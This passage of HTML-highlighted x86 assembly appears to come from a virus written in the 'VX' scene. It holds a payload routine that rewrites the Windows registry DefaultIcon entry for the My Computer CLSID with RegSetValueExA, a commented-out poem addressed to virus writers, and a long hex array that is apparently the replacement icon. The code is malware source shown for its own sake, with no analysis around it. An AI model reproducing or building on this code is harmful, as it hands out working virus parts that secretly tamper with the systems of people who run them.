</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipcount</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'!'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipcount</span><span class="sc0">                   </span><span class="sc1">; whohoho...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'0,'</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">skipcount</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rezo21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegSetValueExA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; overwrite it</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">poem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;   db ' I was in the street today, so long time I didnt saw it',0</span><span class="sc0">
</span><span class="sc1">;   db ' I was afraid coz so long time I didnt saw so much poeple',0</span><span class="sc0">
</span><span class="sc1">;   db ' I tasted beer again, I liked it, I tasted joint, I was planning',0</span><span class="sc0">
</span><span class="sc1">;   db ' I enjoyed with girls, like old good times, when I was happy',0</span><span class="sc0">
</span><span class="sc1">;   db ' But after all these enjoyment, I didnt feel in my garden',0</span><span class="sc0">
</span><span class="sc1">;   db ' Like a bird trying to fly in water, ridiculous like hell',0</span><span class="sc0">
</span><span class="sc1">;   db ' That was my life, excepting to be happy from a computer',0</span><span class="sc0">
</span><span class="sc1">;   db ' Just secure my brain, getting ideas and make them working',0</span><span class="sc0">
</span><span class="sc1">;   db ' I spend so much time behind my computer, loosing my time',0</span><span class="sc0">
</span><span class="sc1">;   db ' I did what I never excepted to do, I remember my beginners ideas',0</span><span class="sc0">
</span><span class="sc1">;   db ' I tryed to go to the infinite, I arrived in hell',0</span><span class="sc0">
</span><span class="sc1">;   db ' If you are like I was, you should follow this tip',0</span><span class="sc0">
</span><span class="sc1">;   db ' Stop vxing guys, you are loosing sensations',0</span><span class="sc0">
</span><span class="sc1">;   db 0</span><span class="sc0">


</span><span class="sc5">mess1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Remember VX meeting times...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">finmess1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ikxico</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\ikx00.ico'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">KeyZero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'SOFTWARE\Classes\'
</span><span class="sc5">KeyOne</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\'
</span><span class="sc5">StoorHere</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DefaultIcon'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">KeyFin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">trademark</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">yeye</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bbh</span><span class="sc0">
